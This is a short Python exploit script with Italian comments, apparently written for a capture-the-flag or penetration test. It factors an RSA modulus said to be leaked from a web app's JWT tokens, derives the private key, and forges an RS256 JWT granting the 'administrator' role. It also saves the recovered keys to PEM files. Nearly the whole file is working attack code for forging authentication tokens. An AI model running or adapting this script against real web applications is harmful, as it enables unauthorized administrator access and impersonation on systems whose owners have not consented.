import sympy
import jwt
from datetime import datetime, timezone, timedelta
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

# Definizione dei parametri pubblici
# Leak dai jwt token della web app
n = 92623021030905880307290801270554328763145365464991833398762557187103218947739926125372977291214046379581110142696090885439000547464864314901180322853482624018149321180023794408401102472133416338481740973813954441963100850478822062005579846156372215999038886791866104441709703074660660288813914182047070325142314469
e = 65537

# Fattorizzazione di n in p e q
factors = sympy.factorint(n)
p, q = list(factors.keys())[:2]  # Estrai i primi due fattori

# Calcolo di φ(n) e della chiave privata d
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
print("La chiave privata d è:", d)

# Creazione della chiave privata RSA
key = RSA.construct((n, e, d, p, q))
private_key_bytes = key.export_key()

# Caricamento della chiave privata
private_key = serialization.load_pem_private_key(private_key_bytes, password=None, backend=default_backend())

# Creazione della chiave pubblica
public_key = private_key.public_key()

# Creazione del payload JWT
payload = {
    'email': 'random@mail.com',
    'role': 'administrator',
    'iat': datetime.now(timezone.utc),
    'exp': datetime.now(timezone.utc) + timedelta(seconds=3600),
    'jwk': {'kty': 'RSA', "n": str(n), "e": e}
}

# Generazione dell'access token JWT
access_token = jwt.encode(payload, private_key_bytes, algorithm='RS256')
print("\n", access_token)

# Salvataggio della chiave privata in formato PEM
private_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.TraditionalOpenSSL,
    encryption_algorithm=serialization.NoEncryption()
)

with open('private_key.pem', 'wb') as f:
    f.write(private_pem)

# Salvataggio della chiave pubblica in formato PEM
public_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open('public_key.pem', 'wb') as f:
    f.write(public_pem)

print("\nChiavi RSA generate e salvate.")
